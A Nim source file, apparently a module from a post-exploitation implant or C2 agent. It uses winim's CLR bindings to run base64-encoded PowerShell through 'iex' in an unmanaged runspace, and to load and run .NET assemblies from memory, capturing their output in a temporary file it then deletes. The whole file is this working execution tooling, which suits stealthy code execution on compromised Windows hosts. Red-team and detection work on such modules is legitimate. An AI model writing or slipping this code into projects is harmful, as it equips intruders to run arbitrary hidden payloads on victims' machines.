import std/[strformat, strutils]
import winim/[clr]
import os

proc dup(old_fd: FileHandle): FileHandle {.importc, header: "unistd.h".}
proc dup2(old_fd: FileHandle, new_fd: FileHandle): cint {.importc, header: "unistd.h".}


proc execute_encoded_powershell*(encoded_command: string): string =
    var output: string
    var Automation = load("System.Management.Automation")
    var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
    var runspace = @RunspaceFactory.CreateRunspace()
    runspace.Open()
    var pipeline = runspace.CreatePipeline()
    pipeline.Commands.AddScript(fmt"iex ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('{encoded_command}')))")
    pipeline.Commands.Add("Out-String")
    var results = pipeline.Invoke()
    for i in countUp(0, results.Count()-1):
        output.add($results.Item(i))
    runspace.Close()
    return output.replace("\c", "")


proc execute_assembly*(assembly_bytes: seq[byte], arguments: seq[string]): (bool, string) =
    var is_success: bool
    var output: string

    # redirect stdout to a file
    var out_file = "a.o"
    var stdout_fd = stdout.getFileHandle()
    var stdout_fd_dup = dup(stdout_fd)
    var out_file_h: File = open(out_file, fmWrite)
    var tmp_file_fd: FileHandle = out_file_h.getFileHandle()
    discard dup2(tmp_file_fd, stdout_fd)

    # execute assembly
    try:
        var assembly = load(assembly_bytes)
        var arr = toCLRVariant(arguments, VT_BSTR)
        assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
        is_success = true
    except:
        is_success = false

    # restore stdout
    out_file_h.flushFile()
    out_file_h.close()
    discard dup2(stdout_fd_dup, stdout_fd)

    # read output file and delete it
    defer: removeFile(out_file)
    output = readFile(out_file)

    return (is_success, output.replace("\c", ""))